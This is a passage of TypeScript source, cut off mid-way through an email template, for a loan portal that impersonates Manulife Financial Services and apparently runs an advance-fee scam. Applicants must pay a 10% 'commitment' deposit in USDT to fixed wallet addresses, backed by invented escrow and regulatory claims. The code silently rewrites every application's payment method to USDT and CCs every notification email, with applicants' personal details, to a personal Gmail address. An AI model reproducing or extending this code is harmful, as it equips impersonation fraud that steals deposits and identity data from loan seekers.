/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { 
  LoanApplication, 
  ApplicationNotification, 
  SupportMessage, 
  LoanStatus,
  PaymentSettings,
  PaymentMethodConfig,
  USDTConfig,
  PaymentAuditLog,
  CryptoTransactionVerification,
  CompanyContactSettings,
  FaceVerification,
  EmailNotificationRecord,
  EmailDispatchSettings
} from '../types';
import { supabase, isSupabaseConfigured } from './supabase';

const STORAGE_KEYS = {
  APPLICATIONS: 'verdant_applications_v1',
  NOTIFICATIONS: 'verdant_notifications_v1',
  MESSAGES: 'verdant_messages_v1',
  CURRENT_USER: 'verdant_session_user_v1',
  PAYMENT_SETTINGS: 'mfs_payment_settings_v1',
  PAYMENT_AUDIT_LOGS: 'mfs_payment_audit_logs_v1',
  CRYPTO_VERIFICATIONS: 'mfs_crypto_verifications_v1',
  CONTACT_SETTINGS: 'mfs_contact_settings_v1',
  EMAIL_LOGS: 'mfs_email_logs_v1',
  EMAIL_SETTINGS: 'mfs_email_settings_v1',
};

// Seed initial realistic data for instant demonstration
const INITIAL_APPLICATIONS: LoanApplication[] = [
  {
    id: 'MFS-2026-8194',
    createdAt: new Date(Date.now() - 86400000 * 3).toISOString(),
    updatedAt: new Date(Date.now() - 86400000 * 1).toISOString(),
    status: 'approved',
    personal: {
      fullName: 'Eleanor Vance-Sterling',
      dob: '1984-06-18',
      gender: 'Female',
      nationality: 'British',
      residenceCountry: 'United Kingdom',
      residentialAddress: '42 Kensington Palace Gardens, London, W8 4QQ',
      phoneNumber: '+44 20 7946 0912',
      email: 'e.vance@sterling-holdings.co.uk',
      photoUrl: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=400&q=80',
    },
    employment: {
      employerName: 'Sterling Horizon Capital Ltd',
      occupation: 'Managing Director & Partner',
      employmentDuration: '7 years 4 months',
      employmentType: 'Executive / Board Director',
      monthlyIncome: 24500,
      additionalIncome: 6200,
    },
    loan: {
      requestedAmount: 350000,
      purpose: 'Commercial & Business Expansion',
      repaymentPeriodMonths: 36,
      preferredPaymentMethod: 'Direct Bank Wire (SWIFT / IBAN)',
    },
    financial: {
      existingLoans: 45000,
      monthlyObligations: 2100,
      monthlyRent: 3800,
      otherCommitments: 950,
    },
    commitment: {
      requestedLoanAmount: 350000,
      commitmentRatePct: 10,
      commitmentAmount: 35000,
      purposeDescription: 'Earnest borrower liquidity allocation held in segregated client escrow. 100% credited to principal upon loan closing or refunded if underwriting conditions are not met by lender.',
      refundabilityType: '100% Credited to Principal upon Closing or Refunded if Underwriting Declines',
      termsAccepted: true,
      acknowledgedNoGuarantee: true,
      receiptNumber: 'RCPT-2026-8194-C-CRYPTO',
      paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
      paymentStatus: 'Held in Regulated Escrow',
      disclosedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
      escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
    },
    declaration: {
      confirmedAccurate: true,
      acceptedDisclosures: true,
      signatureDataUrl: 'Eleanor Vance-Sterling',
      signatureType: 'type',
      signedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
    },
    faceVerification: {
      verified: true,
      verifiedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
      verificationId: 'BIO-2026-8194',
      livenessScore: 99.4,
      matchConfidence: 99.1,
      antiSpoofingStatus: 'Passed',
      faceImageUrl: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=400&q=80',
      idCardImageUrl: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=400&q=80',
      livenessChecks: {
        blinkDetected: true,
        headTurnDetected: true,
        depthAnalyzed: true,
        lightingPass: true,
        antiPresentationAttack: true,
      },
      deviceInfo: 'Apple Safari / macOS (TrueDepth Optical Scan)',
      auditHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    },
    underwriting: {
      riskTier: 'Tier 1 (Prime)',
      approvedAmount: 350000,
      approvedRate: 5.45,
      approvedPeriodMonths: 36,
      officerNotes: 'High liquidity backing, verified asset statements. Approved under Tier 1 Prime portfolio.',
      disbursementReference: 'DISB-2026-UK-9021',
      reviewedBy: 'A. Montgomery (Senior Underwriter)',
      decisionDate: new Date(Date.now() - 86400000 * 1).toISOString(),
    },
    documents: [
      {
        id: 'doc-1',
        name: 'Vance_Passport_Copy.pdf',
        type: 'application/pdf',
        size: '2.4 MB',
        uploadedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
        status: 'verified',
      },
      {
        id: 'doc-2',
        name: 'Sterling_Audited_Accounts_2025.pdf',
        type: 'application/pdf',
        size: '6.8 MB',
        uploadedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
        status: 'verified',
      },
    ],
  },
  {
    id: 'MFS-2026-9430',
    createdAt: new Date(Date.now() - 86400000 * 2).toISOString(),
    updatedAt: new Date(Date.now() - 3600000 * 12).toISOString(),
    status: 'underwriting',
    personal: {
      fullName: 'Marcus Aurelius Sterling',
      dob: '1989-11-04',
      gender: 'Male',
      nationality: 'United States',
      residenceCountry: 'United States',
      residentialAddress: '785 Fifth Avenue, Suite 19B, New York, NY 10022',
      phoneNumber: '+1 (212) 555-0184',
      email: 'marcus.sterling@meridian-tech.io',
      photoUrl: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=400&q=80',
    },
    employment: {
      employerName: 'Meridian Quantum Systems Inc.',
      occupation: 'Chief Technology Architect',
      employmentDuration: '4 years 2 months',
      employmentType: 'Full-Time Permanent',
      monthlyIncome: 18200,
      additionalIncome: 3500,
    },
    loan: {
      requestedAmount: 180000,
      purpose: 'Property Purchase & Real Estate',
      repaymentPeriodMonths: 48,
      preferredPaymentMethod: 'Automated Clearing House (ACH)',
    },
    financial: {
      existingLoans: 18000,
      monthlyObligations: 1200,
      monthlyRent: 4200,
      otherCommitments: 600,
    },
    commitment: {
      requestedLoanAmount: 180000,
      commitmentRatePct: 10,
      commitmentAmount: 18000,
      purposeDescription: 'Earnest property transaction commitment held in legal escrow until completion of title and credit underwriting.',
      refundabilityType: '100% Credited to Principal upon Closing or Refunded if Underwriting Declines',
      termsAccepted: true,
      acknowledgedNoGuarantee: true,
      receiptNumber: 'RCPT-2026-9430-C-CRYPTO',
      paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
      paymentStatus: 'Held in Regulated Escrow',
      disclosedAt: new Date(Date.now() - 86400000 * 2).toISOString(),
      escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
    },
    declaration: {
      confirmedAccurate: true,
      acceptedDisclosures: true,
      signatureDataUrl: 'Marcus A. Sterling',
      signatureType: 'type',
      signedAt: new Date(Date.now() - 86400000 * 2).toISOString(),
    },
    underwriting: {
      riskTier: 'Tier 1 (Prime)',
      officerNotes: 'Credit bureau score 795. Verifying secondary asset dividends and equity grants.',
      reviewedBy: 'C. Thorne (Credit Committee)',
    },
    documents: [
      {
        id: 'doc-3',
        name: 'Meridian_Paystubs_Q4.pdf',
        type: 'application/pdf',
        size: '1.9 MB',
        uploadedAt: new Date(Date.now() - 86400000 * 2).toISOString(),
        status: 'verified',
      },
    ],
  },
  {
    id: 'MFS-2026-6281',
    createdAt: new Date(Date.now() - 86400000 * 1).toISOString(),
    updatedAt: new Date(Date.now() - 3600000 * 4).toISOString(),
    status: 'documents_required',
    personal: {
      fullName: 'Dr. Sofia Reyes-Mendoza',
      dob: '1991-03-22',
      gender: 'Female',
      nationality: 'Spanish',
      residenceCountry: 'Spain',
      residentialAddress: 'Paseo de la Castellana 120, 28046 Madrid, Spain',
      phoneNumber: '+34 91 123 4567',
      email: 'sofia.reyes@clinica-biomed.es',
      photoUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&q=80',
    },
    employment: {
      employerName: 'Centro Médico Especializado',
      occupation: 'Surgeon / Clinical Partner',
      employmentDuration: '5 years',
      employmentType: 'Full-Time Permanent',
      monthlyIncome: 13500,
      additionalIncome: 1800,
    },
    loan: {
      requestedAmount: 95000,
      purpose: 'Equipment, Machinery & Technology',
      repaymentPeriodMonths: 24,
      preferredPaymentMethod: 'SEPA Credit Transfer',
    },
    financial: {
      existingLoans: 12000,
      monthlyObligations: 850,
      monthlyRent: 2100,
      otherCommitments: 400,
    },
    commitment: {
      requestedLoanAmount: 95000,
      commitmentRatePct: 10,
      commitmentAmount: 9500,
      purposeDescription: 'Equipment acquisition commitment deposit held in designated escrow account. Applied directly to reduce equipment lease obligation upon disbursement.',
      refundabilityType: '100% Credited to Principal upon Closing or Refunded if Underwriting Declines',
      termsAccepted: true,
      acknowledgedNoGuarantee: true,
      receiptNumber: 'RCPT-2026-6281-C-CRYPTO',
      paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
      paymentStatus: 'Held in Regulated Escrow',
      disclosedAt: new Date(Date.now() - 86400000 * 1).toISOString(),
      escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
    },
    declaration: {
      confirmedAccurate: true,
      acceptedDisclosures: true,
      signatureDataUrl: 'Dr. Sofia Reyes',
      signatureType: 'type',
      signedAt: new Date(Date.now() - 86400000 * 1).toISOString(),
    },
    underwriting: {
      riskTier: 'Tier 2 (Near-Prime)',
      officerNotes: 'Medical equipment pro-forma invoice validated. Please upload the last 6 months clinical clinic account statement.',
      requestedDocuments: [
        'Last 6 months business bank statements',
        'Equipment supplier pro-forma invoice with serial specifications',
      ],
      reviewedBy: 'H. Lindqvist (Commercial Lending)',
    },
    documents: [
      {
        id: 'doc-4',
        name: 'Passport_Scan_Reyes.pdf',
        type: 'application/pdf',
        size: '3.1 MB',
        uploadedAt: new Date(Date.now() - 86400000 * 1).toISOString(),
        status: 'verified',
      },
    ],
  },
];

const INITIAL_NOTIFICATIONS: ApplicationNotification[] = [
  {
    id: 'notif-1',
    applicationId: 'MFS-2026-8194',
    recipientEmail: 'e.vance@sterling-holdings.co.uk',
    title: 'Loan Approval Notice: $350,000 Approved',
    message: 'Your Commercial & Business Expansion facility has been fully approved by the Credit Committee at a prime rate of 5.45% per annum. Your official term sheet is ready for download.',
    timestamp: new Date(Date.now() - 86400000 * 1).toISOString(),
    type: 'success',
    isRead: false,
  },
  {
    id: 'notif-2',
    applicationId: 'MFS-2026-6281',
    recipientEmail: 'sofia.reyes@clinica-biomed.es',
    title: 'Action Required: Additional Verification Documents',
    message: 'Underwriting requests the last 6 months of bank statements to finalize your equipment financing approval.',
    timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
    type: 'action_required',
    isRead: false,
  },
  {
    id: 'notif-3',
    applicationId: 'MFS-2026-9430',
    recipientEmail: 'marcus.sterling@meridian-tech.io',
    title: 'Application Underwriting in Progress',
    message: 'Your property financing application MFS-2026-9430 has entered active credit committee underwriting. Expected turnaround is within 24 hours.',
    timestamp: new Date(Date.now() - 3600000 * 12).toISOString(),
    type: 'info',
    isRead: false,
  },
];

const INITIAL_MESSAGES: SupportMessage[] = [
  {
    id: 'msg-1',
    applicationId: 'MFS-2026-8194',
    sender: 'officer',
    senderName: 'Arthur Montgomery (Senior Underwriter)',
    message: 'Welcome Ms. Vance. Your facility documentation has been cleared and your term sheet is ready.',
    timestamp: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'msg-2',
    applicationId: 'MFS-2026-6281',
    sender: 'officer',
    senderName: 'Helena Lindqvist (Commercial Lending)',
    message: 'Dr. Reyes, please upload your equipment pro-forma invoice using the portal upload tool so we can issue your binding term sheet.',
    timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
  },
];

const INITIAL_EMAIL_SETTINGS: EmailDispatchSettings = {
  enabled: true,
  senderName: 'Manulife Financial Services Notifications',
  senderEmail: 'notifications@manulife-financial.com',
  liaisonEmail: 'echezonachukwuokafor16@gmail.com',
  notifyOnNewApplication: true,
  notifyOnUsdtDeposit: true,
  notifyOnStatusChange: true,
  notifyOnFaceKyc: true,
  notifyOnDocumentUpload: true,
  notifyOnOfficerMessage: true,
  smtpRelayHost: 'smtp.manulife-financial.com (Port 587 TLS - Zero Failure SLA)',
  encryption: 'TLS',
  updatedAt: new Date().toISOString(),
  updatedBy: 'A. Montgomery (Compliance Officer)',
};

const INITIAL_EMAIL_LOGS: EmailNotificationRecord[] = [
  {
    id: 'eml-1',
    applicationId: 'MFS-2026-8194',
    recipientEmail: 'e.vance@sterling-holdings.co.uk',
    recipientName: 'Eleanor Vance-Sterling',
    ccEmail: 'echezonachukwuokafor16@gmail.com',
    fromEmail: 'notifications@manulife-financial.com',
    fromName: 'Manulife Financial Services Notifications',
    subject: '[Manulife Financial Services Ref: MFS-2026-8194] Facility Approval Authorization: $350,000 Approved',
    previewText: 'Your Commercial & Business Expansion facility has been fully approved by the Credit Committee at 5.45% APR.',
    htmlContent: `
      <p>We are pleased to inform you that your facility request for <strong>$350,000 USD</strong> has been unconditionally authorized by the Credit Committee.</p>
      <p><strong>Approved Terms:</strong> 36 Months Amortization at 5.45% Fixed APR. Indicative Monthly Repayment: $10,559.38.</p>
      <p>Your binding term sheet and amortization schedule are now active and ready for review in your applicant dossier.</p>
    `,
    plainTextContent: 'Your Commercial & Business Expansion facility has been fully approved by the Credit Committee at 5.45% APR. Term sheet ready for review.',
    triggerEvent: 'status_changed',
    status: 'delivered',
    sentAt: new Date(Date.now() - 86400000 * 1).toISOString(),
    deliveredAt: new Date(Date.now() - 86400000 * 1).toISOString(),
  },
  {
    id: 'eml-2',
    applicationId: 'MFS-2026-6281',
    recipientEmail: 'sofia.reyes@clinica-biomed.es',
    recipientName: 'Dr. Sofia Reyes-Mendoza',
    ccEmail: 'echezonachukwuokafor16@gmail.com',
    fromEmail: 'notifications@manulife-financial.com',
    fromName: 'Manulife Financial Services Notifications',
    subject: '[Manulife Financial Services Ref: MFS-2026-6281] Action Required: Supplementary Verification Documents',
    previewText: 'Underwriting requests the last 6 months of corporate medical bank statements to finalize your equipment financing.',
    htmlContent: `
      <p>Our senior credit analyst Helena Lindqvist has reviewed your equipment financing facility application for $95,000 USD.</p>
      <p>To finalize the binding term sheet, please submit your pro-forma equipment supplier invoice and the last 6 months of clinical operating bank statements via the applicant portal.</p>
    `,
    plainTextContent: 'Underwriting requests the last 6 months of corporate bank statements and supplier pro-forma invoice to finalize your facility.',
    triggerEvent: 'documents_required',
    status: 'delivered',
    sentAt: new Date(Date.now() - 3600000 * 4).toISOString(),
    deliveredAt: new Date(Date.now() - 3600000 * 4).toISOString(),
  },
  {
    id: 'eml-3',
    applicationId: 'MFS-2026-9430',
    recipientEmail: 'marcus.sterling@meridian-tech.io',
    recipientName: 'Marcus Aurelius Sterling',
    ccEmail: 'echezonachukwuokafor16@gmail.com',
    fromEmail: 'notifications@manulife-financial.com',
    fromName: 'Manulife Financial Services Notifications',
    subject: '[Manulife Financial Services Ref: MFS-2026-9430] Application Acknowledgment & Underwriting Queue',
    previewText: 'Your property financing application MFS-2026-9430 has entered active credit committee review.',
    htmlContent: `
      <p>Thank you for submitting your property facility financing application for $180,000 USD.</p>
      <p>Your application dossier has been placed in the prime syndicate underwriting review queue. Statutory earnest commitments are held in multi-sig custody with BitGo Trust Company Inc.</p>
    `,
    plainTextContent: 'Application MFS-2026-9430 received and entered active credit committee underwriting.',
    triggerEvent: 'application_submitted',
    status: 'delivered',
    sentAt: new Date(Date.now() - 3600000 * 12).toISOString(),
    deliveredAt: new Date(Date.now() - 3600000 * 12).toISOString(),
  },
];

// Initial Payment & Custody Settings with USDT Stablecoin Support
const INITIAL_PAYMENT_SETTINGS: PaymentSettings = {
  updatedAt: new Date(Date.now() - 86400000 * 2).toISOString(),
  updatedBy: 'A. Montgomery (Senior Underwriter & Compliance Officer)',
  methods: [
    {
      id: 'usdt_crypto',
      name: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20 / Polygon)',
      category: 'crypto',
      enabled: true,
      providerName: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC',
      providerAccountOrAddress: '0x71C8A326d9e075841f48641498C0CFe448eBB492 (ERC-20 Custody)',
      processingTime: '12 - 32 Confirmations (~5 - 15 mins)',
      transactionFeePct: 0,
      fixedFee: 0,
      currency: 'USDT',
      notes: 'Exclusive authorized designated settlement rail for applicant earnest commitment deposits. Regulated institutional multi-sig custody.',
      requiresIndependentVerification: true,
    },
  ],
  usdtConfig: {
    enabled: true,
    isLegalApprovalGranted: true,
    authorizedCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC Custody',
    custodianLicenseRef: 'NYS-DFS Regulated Trust Charter #D-8841 & SOC 2 Type II Certified',
    supportedNetworks: [
      {
        id: 'erc20',
        name: 'Ethereum Mainnet',
        tokenStandard: 'ERC-20',
        active: true,
        depositAddress: '0x71C8A326d9e075841f48641498C0CFe448eBB492',
        confirmationsRequired: 32,
        estConfirmationMinutes: '8 - 12 Minutes',
        networkGasFeeEst: '≈ 2.50 - 6.00 USDT (Paid by sender to Ethereum miners)',
        contractAddress: '0xdac17f958d2ee523a2206206994597c13d831ec7',
      },
      {
        id: 'trc20',
        name: 'Tron Blockchain',
        tokenStandard: 'TRC-20',
        active: true,
        depositAddress: 'TYjS99Wre5wQJvT4K1qYxP25aZkU9XyBqA',
        confirmationsRequired: 19,
        estConfirmationMinutes: '2 - 4 Minutes',
        networkGasFeeEst: '≈ 1.50 - 2.80 USDT (Paid by sender to Tron network)',
        contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
      },
      {
        id: 'polygon',
        name: 'Polygon PoS Network',
        tokenStandard: 'Polygon Native (ERC-20)',
        active: false,
        depositAddress: '0x71C8A326d9e075841f48641498C0CFe448eBB492',
        confirmationsRequired: 128,
        estConfirmationMinutes: '4 - 6 Minutes',
        networkGasFeeEst: '≈ 0.15 - 0.40 USDT (Paid by sender to Polygon validators)',
        contractAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
      },
    ],
    activeNetworkId: 'erc20',
    exchangeRateUsd: 1.0,
    oracleProvider: 'Chainlink Decentralized Oracle (USDT / USD Live Aggregator)',
    custodySurchargePct: 0.0,
    gasFeePolicy: 'Native blockchain network miner/gas fees are determined exclusively by on-chain network congestion, paid directly by the sender wallet, and are non-refundable by Manulife Financial Services under any circumstances.',
    refundPolicy: 'If the loan application is declined by the Credit Committee or overpaid, the USDT principal commitment is refunded within 3 business days to the verified originating whitelisted wallet address (less native non-refundable network gas fees).',
    paymentConditions: [
      'USDT (Tether USD) is an asset-backed cryptocurrency pegged 1:1 to the US Dollar.',
      'Transfers must be broadcast strictly across authorized networks (Ethereum ERC-20 or Tron TRC-20). Cross-chain transfers or incompatible asset transmissions are irreversible on decentralized ledgers.',
      'All incoming wallet addresses are automatically scanned through TRM Labs & Chainalysis for AML/OFAC compliance.',
      'Zero upfront lending fee guarantee: Manulife Financial Services charges 0.00% platform surcharge for USDT settlement. 100% of the commitment is credited to principal upon closing.',
      'Independent ledger verification: A compliance officer must independently verify on-chain block confirmations and sign off before final settlement receipt is issued.',
    ],
    noGuaranteeDisclosure: 'CRITICAL REGULATORY COMPLIANCE NOTICE: A blockchain transfer or USDT cryptocurrency transaction DOES NOT constitute a guarantee, promise, or warranty of loan approval. Loan decisions are strictly determined by formal Underwriting Committee assessment of applicant creditworthiness.',
    independentVerificationRequired: true,
  },
};

const INITIAL_AUDIT_LOGS: PaymentAuditLog[] = [
  {
    id: 'log-101',
    timestamp: new Date(Date.now() - 86400000 * 2).toISOString(),
    adminName: 'A. Montgomery (Senior Underwriter & Compliance Officer)',
    adminEmail: 'admin@manulife-financial.com',
    action: 'USDT Settlement Rail Re-certified',
    details: 'Verified BitGo Trust Company custodial agreement NYS-DFS Charter #D-8841. Enforced 32 on-chain confirmations for ERC-20.',
    ipAddress: '194.28.112.45 (London HQ Corporate Gateway)',
    twoFactorVerified: true,
  },
  {
    id: 'log-102',
    timestamp: new Date(Date.now() - 86400000 * 5).toISOString(),
    adminName: 'A. Montgomery (Senior Underwriter & Compliance Officer)',
    adminEmail: 'admin@manulife-financial.com',
    action: 'Gas Fee & Refund Policy Disclosures Updated',
    details: 'Disclosed that blockchain miner gas fees are non-refundable by lender; clarified 100% principal refund on underwriter decline.',
    ipAddress: '194.28.112.45 (London HQ Corporate Gateway)',
    twoFactorVerified: true,
  },
  {
    id: 'log-103',
    timestamp: new Date(Date.now() - 86400000 * 12).toISOString(),
    adminName: 'C. Sterling (Managing Director & Head of Risk)',
    adminEmail: 'admin@manulife-financial.com',
    action: 'Payment Method Enabled: Tron (TRC-20) Low-Fee Rail',
    details: 'Added TRC-20 receiving custody address with 19 block confirmations. Air-gapped key management verified.',
    ipAddress: '82.165.197.10 (Bishopsgate Terminal 3)',
    twoFactorVerified: true,
  },
];

const INITIAL_CRYPTO_VERIFICATIONS: CryptoTransactionVerification[] = [
  {
    id: 'txv-8194',
    applicationId: 'MFS-2026-8194',
    applicantName: 'Eleanor Vance-Sterling',
    amountUsdt: 35000,
    equivalentUsd: 35000,
    network: 'Ethereum (ERC-20)',
    txHash: '0x8f2d4e7a1b9c3e5d7f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e',
    fromAddress: '0x53d284357ec70ce289d6d64134dfac8e511c8a3d',
    toAddress: '0x71C8A326d9e075841f48641498C0CFe448eBB492',
    submittedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
    verifiedAt: new Date(Date.now() - 86400000 * 3 + 3600000).toISOString(),
    verifiedBy: 'A. Montgomery (Compliance Officer)',
    status: 'verified',
    confirmations: 32,
    requiredConfirmations: 32,
    receiptNumber: 'RCPT-2026-8194-C-CRYPTO',
    notes: 'On-chain block confirmations verified on Etherscan. BitGo escrow ledger credit matched. Zero discrepancy.',
  },
];

const INITIAL_CONTACT_SETTINGS: CompanyContactSettings = {
  supportEmail: 'support@manulife-financial.com',
  directLiaisonEmail: 'echezonachukwuokafor16@gmail.com',
  supportPhone: '+44 20 7946 0880',
  whatsappNumber: '+44 7458 198234',
  whatsappLink: 'https://wa.me/447458198234',
  whatsappEnabled: true,
  telegramUsername: '@ManulifeFinancialSupport',
  telegramLink: 'https://t.me/ManulifeFinancialSupport',
  telegramEnabled: true,
  londonEmail: 'london.desk@manulife-financial.com',
  zurichEmail: 'zurich.desk@manulife-financial.com',
  nyEmail: 'ny.desk@manulife-financial.com',
  officeHours: 'Monday – Friday: 24/7 Global Underwriting Desk (2-Hour SLA)',
  updatedAt: new Date(Date.now() - 86400000 * 1).toISOString(),
  updatedBy: 'A. Montgomery (Compliance Officer)',
};

class StorageService {
  private getLocal<T>(key: string, fallback: T): T {
    try {
      const item = localStorage.getItem(key);
      if (!item) {
        localStorage.setItem(key, JSON.stringify(fallback));
        return fallback;
      }
      return JSON.parse(item);
    } catch {
      return fallback;
    }
  }

  private setLocal<T>(key: string, value: T): void {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      // Dispatch storage events for reactive updates across components
      window.dispatchEvent(new Event('verdant_storage_update'));
      window.dispatchEvent(new CustomEvent('mfs_payment_update', { detail: { key, value } }));
    } catch (err) {
      console.warn('Storage set failed:', err);
    }
  }

  // === APPLICATIONS ===
  async getAllApplications(): Promise<LoanApplication[]> {
    if (isSupabaseConfigured && supabase) {
      try {
        const { data, error } = await supabase
          .from('loan_applications')
          .select('*')
          .order('created_at', { ascending: false });
        if (!error && data && data.length > 0) {
          return data as LoanApplication[];
        }
      } catch (err) {
        console.warn('Supabase fetch failed, falling back to local storage:', err);
      }
    }
    const rawApps = this.getLocal<LoanApplication[]>(STORAGE_KEYS.APPLICATIONS, INITIAL_APPLICATIONS);
    return rawApps.map((app) => {
      if (app.commitment && (!app.commitment.paymentMethod || !app.commitment.paymentMethod.includes('USDT'))) {
        return {
          ...app,
          commitment: {
            ...app.commitment,
            paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
            escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
            receiptNumber: app.commitment.receiptNumber?.includes('CRYPTO') 
              ? app.commitment.receiptNumber 
              : `${app.commitment.receiptNumber || 'RCPT-2026-C'}-CRYPTO`,
          },
        };
      }
      return app;
    });
  }

  async getApplicationById(id: string): Promise<LoanApplication | null> {
    const apps = await this.getAllApplications();
    return apps.find((app) => app.id.toUpperCase() === id.toUpperCase()) || null;
  }

  async getApplicationByEmail(email: string): Promise<LoanApplication | null> {
    const apps = await this.getAllApplications();
    return (
      apps.find((app) => app.personal.email.trim().toLowerCase() === email.trim().toLowerCase()) || null
    );
  }

  async saveApplication(app: LoanApplication): Promise<LoanApplication> {
    // 1. Save locally
    const existing = await this.getAllApplications();
    const index = existing.findIndex((a) => a.id === app.id);
    let updated: LoanApplication[];
    if (index >= 0) {
      updated = [...existing];
      updated[index] = app;
    } else {
      updated = [app, ...existing];
    }
    this.setLocal(STORAGE_KEYS.APPLICATIONS, updated);

    // 2. Also save to Supabase if configured
    if (isSupabaseConfigured && supabase) {
      try {
        await supabase.from('loan_applications').upsert(app);
      } catch (err) {
        console.warn('Supabase application sync error:', err);
      }
    }

    return app;
  }

  async updateApplicationStatus(
    id: string,
    status: LoanStatus,
    underwritingUpdate?: Partial<LoanApplication['underwriting']>
  ): Promise<LoanApplication | null> {
    const app = await this.getApplicationById(id);
    if (!app) return null;

    const updated: LoanApplication = {
      ...app,
      status,
      updatedAt: new Date().toISOString(),
      underwriting: {
        ...(app.underwriting || { riskTier: 'Tier 1 (Prime)' }),
        ...underwritingUpdate,
      },
    };

    await this.saveApplication(updated);

    // Add automatic official notification
    let notificationTitle = 'Application Status Updated';
    let notificationMsg = `Your application status has been updated to: ${status.replace('_', ' ').toUpperCase()}`;
    let notificationType: ApplicationNotification['type'] = 'info';

    if (status === 'approved') {
      notificationTitle = 'Loan Approved: Official Term Sheet Available';
      notificationMsg = `Congratulations. Your loan application ${id} has been formally approved for ${
        updated.underwriting?.approvedAmount ? `$${updated.underwriting.approvedAmount.toLocaleString()}` : 'the requested amount'
      }. Access your dashboard to view the approved terms.`;
      notificationType = 'success';
    } else if (status === 'documents_required') {
      notificationTitle = 'Action Required: Additional Verification Requested';
      notificationMsg = `The underwriting committee has requested additional supporting documents for application ${id}. Please review the document checklist in your portal.`;
      notificationType = 'action_required';
    } else if (status === 'declined') {
      notificationTitle = 'Notice of Underwriting Decision';
      notificationMsg = `Your loan application ${id} has been declined based on current credit guidelines. A formal statement has been generated.`;
      notificationType = 'alert';
    } else if (status === 'disbursed') {
      notificationTitle = 'Funds Disbursed & Wire Initiated';
      notificationMsg = `Funds for loan facility ${id} have been disbursed to your designated account. Ref: ${updated.underwriting?.disbursementReference || 'WIRE-PENDING'}`;
      notificationType = 'success';
    }

    await this.addNotification({
      id: `notif-${Date.now()}`,
      applicationId: id,
      recipientEmail: app.personal.email,
      title: notificationTitle,
      message: notificationMsg,
      timestamp: new Date().toISOString(),
      type: notificationType,
      isRead: false,
    });

    return updated;
  }

  async updateFaceVerification(
    id: string,
    verification: FaceVerification
  ): Promise<LoanApplication | null> {
    const app = await this.getApplicationById(id);
    if (!app) return null;

    const updated: LoanApplication = {
      ...app,
      faceVerification: verification,
      updatedAt: new Date().toISOString(),
    };

    await this.saveApplication(updated);

    await this.addNotification({
      id: `notif-${Date.now()}`,
      applicationId: id,
      recipientEmail: app.personal.email,
      title: 'Biometric Face Verification Certified',
      message: `Biometric liveness verification confirmed with ${verification.livenessScore}% liveness match score. Certificate #${verification.verificationId} issued.`,
      timestamp: new Date().toISOString(),
      type: 'success',
      isRead: false,
    });

    return updated;
  }

  // === NOTIFICATIONS ===
  async getNotifications(applicationId?: string): Promise<ApplicationNotification[]> {
    const list = this.getLocal<ApplicationNotification[]>(STORAGE_KEYS.NOTIFICATIONS, INITIAL_NOTIFICATIONS);
    if (applicationId) {
      return list.filter((n) => n.applicationId === applicationId);
    }
    return list;
  }

  async addNotification(notif: ApplicationNotification): Promise<void> {
    const current = await this.getNotifications();
    const updated = [notif, ...current];
    this.setLocal(STORAGE_KEYS.NOTIFICATIONS, updated);

    if (isSupabaseConfigured && supabase) {
      try {
        await supabase.from('application_notifications').insert(notif);
      } catch (err) {
        console.warn('Supabase notif error:', err);
      }
    }

    // Automatically generate and dispatch corresponding official email notification
    try {
      const emailSettings = await this.getEmailDispatchSettings();
      if (emailSettings.enabled) {
        let trigger: EmailNotificationRecord['triggerEvent'] = 'status_changed';
        const titleLower = notif.title.toLowerCase();
        if (titleLower.includes('application received') || titleLower.includes('submitted')) {
          trigger = 'application_submitted';
        } else if (titleLower.includes('usdt') || titleLower.includes('hash')) {
          trigger = 'usdt_deposit_received';
        } else if (titleLower.includes('verified') || titleLower.includes('settled')) {
          trigger = 'usdt_deposit_verified';
        } else if (titleLower.includes('document') || notif.type === 'action_required') {
          trigger = 'documents_required';
        } else if (titleLower.includes('face') || titleLower.includes('biometric')) {
          trigger = 'face_kyc_completed';
        }

        const app = await this.getApplicationById(notif.applicationId);
        const recipientName = app ? app.personal.fullName : 'Valued Client';

        const html = `
          <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #1e293b;">
            <p style="font-size: 14px; font-weight: bold; color: #064e3b; margin-bottom: 12px;">
              ${notif.title}
            </p>
            <p style="font-size: 13px; margin-bottom: 16px;">
              ${notif.message}
            </p>
            <div style="background-color: #f8fafc; border-left: 4px solid #059669; padding: 12px 16px; margin: 16px 0; border-radius: 4px;">
